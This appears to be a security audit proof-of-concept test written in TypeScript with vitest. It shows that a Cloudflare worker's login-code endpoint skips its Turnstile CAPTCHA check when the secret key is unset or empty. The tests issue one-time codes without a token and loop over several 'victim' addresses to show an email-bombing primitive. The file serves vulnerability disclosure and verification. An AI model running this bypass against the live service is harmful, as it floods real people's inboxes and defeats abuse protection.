/**
 * p10-001 PoC: Turnstile fail-open when TURNSTILE_SECRET_KEY is unset.
 * NOT part of the project test suite. Runs the real worker in workerd
 * against local D1 seeded with production migrations.
 *
 * Proves:
 *  A. Default config (secret unset): /api/auth/send-code succeeds with NO
 *     turnstileToken -> OTP issued. Fail-open confirmed on the real stack.
 *  B. Empty-string secret: [REDACTED:secret] fail-open.
 *  C. Control: when the secret IS set, the same request is rejected (400)
 *     -> the only variable flipping the gate is presence of the secret.
 *  D. Impact: unattended sends across distinct victim emails succeed
 *     (email-bombing primitive bounded only by the per-email cap).
 */
import { appendFileSync } from 'node:fs';
import '../src/cloudflare-test.d.ts';
import { describe, it, expect, beforeAll } from 'vitest';
import { env, createExecutionContext, waitOnExecutionContext } from 'cloudflare:test';
import worker from '../src/worker';

function req(path: string, body?: string): Request {
  return new Request(`https://omg-api.latham.cloud${path}`, {
    method: 'POST',
    headers: new Headers({ 'Content-Type': 'application/json' }),
    body,
  });
}

async function dispatch(request: Request): Promise<Response> {
  const context = createExecutionContext();
  const response = await worker.fetch(request, env, context);
  await waitOnExecutionContext(context);
  return response;
}

async function sendCode(email: string): Promise<{ status: number; body: Record<string, unknown> }> {
  const res = await dispatch(req('/api/auth/send-code', JSON.stringify({ email })));
  return { status: res.status, body: (await res.json()) as Record<string, unknown> };
}

const RESULT_FILE =
  process.env.P10_001_RESULT_FILE ?? '/tmp/p10-001-results.txt';
function mark(line: string): void {
  // Persist evidence durably (vitest swallows console.* in non-TTY runs
  // unless run with --disable-console-intercept, so emit both ways).
  try {
    appendFileSync(RESULT_FILE, line + '\n');
  } catch {
    // node:fs unavailable inside workerd sandbox - stdout marker still emitted
  }
  console.log(line);
}

describe('p10-001: Turnstile fail-open when TURNSTILE_SECRET_KEY unset', () => {
  beforeAll(() => {
    // Stub non-essential bindings; keep everything else real (workerd + D1).
    (env as Record<string, unknown>).JWT_SECRET = 'p13-poc-jwt-secret';
    (env as Record<string, unknown>).EMAIL = { send: async () => undefined };
    (env as Record<string, unknown>).SENTRY_DSN = undefined;
  });

  it('A: secret unset -> send-code succeeds with NO turnstile token', async () => {
    (env as Record<string, unknown>).TURNSTILE_SECRET_KEY = undefined;

    const r = await sendCode('victim-a@anywhere.test');
    const otpRow = await env.DB.prepare(
      `SELECT id FROM auth_codes WHERE email = 'victim-a@anywhere.test' AND used = 0`
    ).first();

    mark(`P10-001-RESULT A_status=${r.status}`);
    mark(`P10-001-RESULT A_success=${JSON.stringify(r.body.success)}`);
    mark(`P10-001-RESULT A_otp_row_issued=${otpRow !== null}`);

    expect(r.status).toBe(200);
    expect(r.body.success).toBe(true);
    expect(otpRow).not.toBeNull();
  });

  it('B: empty-string secret -> same fail-open', async () => {
    (env as Record<string, unknown>).TURNSTILE_SECRET_KEY = '';

    const r = await sendCode('victim-b@anywhere.test');
    mark(`P10-001-RESULT B_status=${r.status}`);
    expect(r.status).toBe(200);
    expect(r.body.success).toBe(true);
  });

  it('C: control - secret configured -> request WITHOUT token rejected', async () => {
    (env as Record<string, unknown>).TURNSTILE_SECRET_KEY = 'real-secret-configured';

    const r = await sendCode('victim-c@anywhere.test');
    mark(`P10-001-RESULT C_control_status=${r.status}`);
    mark(`P10-001-RESULT C_control_error=${JSON.stringify(r.body.error ?? r.body.message)}`);
    expect(r.status).toBe(400);
  });

  it('D: impact - unattended OTP issuance across distinct victim emails', async () => {
    (env as Record<string, unknown>).TURNSTILE_SECRET_KEY = undefined;

    const statuses: number[] = [];
    for (let i = 0; i < 5; i++) {
      const r = await sendCode(`bomb-${i}@victim-domain.test`);
      statuses.push(r.status);
    }
    const delivered = statuses.filter(s => s === 200).length;
    const rows = await env.DB.prepare(
      `SELECT COUNT(*) AS n FROM auth_codes WHERE email LIKE 'bomb-%@victim-domain.test' AND used = 0`
    ).first<{ n: number }>();

    mark(`P10-001-RESULT D_statuses=${statuses.join(',')}`);
    mark(`P10-001-RESULT D_delivered=${delivered}/5`);
    mark(`P10-001-RESULT D_otp_rows=${rows?.n}`);

    expect(delivered).toBe(5);
    expect(rows?.n).toBe(5);
  });
});
